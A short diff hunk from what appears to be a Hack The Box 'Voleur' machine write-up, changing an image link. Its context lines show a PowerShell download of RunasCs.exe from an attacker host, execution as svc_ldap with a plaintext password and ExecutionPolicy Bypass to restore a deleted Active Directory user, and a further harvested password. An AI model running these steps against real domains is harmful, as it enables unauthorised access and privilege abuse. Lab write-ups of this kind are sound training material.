@@ -247,7 +247,7 @@ Invoke-WebRequest -Uri 'http://10.10.16.32:8080/RunasCs.exe' -OutFile 'RunasCs.e
 
 .\RunasCs.exe svc_ldap M1XyC9pW7qT5Vn "powershell.exe -NoProfile -ExecutionPolicy Bypass -Command Restore-ADObject 'CN=Todd Wolfe\0ADEL:1c6b1deb-c372-4cbb-87b1-15031de169db,CN=Deleted Objects,DC=voleur,DC=htb'"
 ```
-![RESURRECTION](/assets/images/VOLEUR/restore.png)
+![RESURRECTION](/assets/images/VOLEUR/rename.png)
 
 Todd is back. Password from the spreadsheet: `NightT1meP1dg3on14`
 
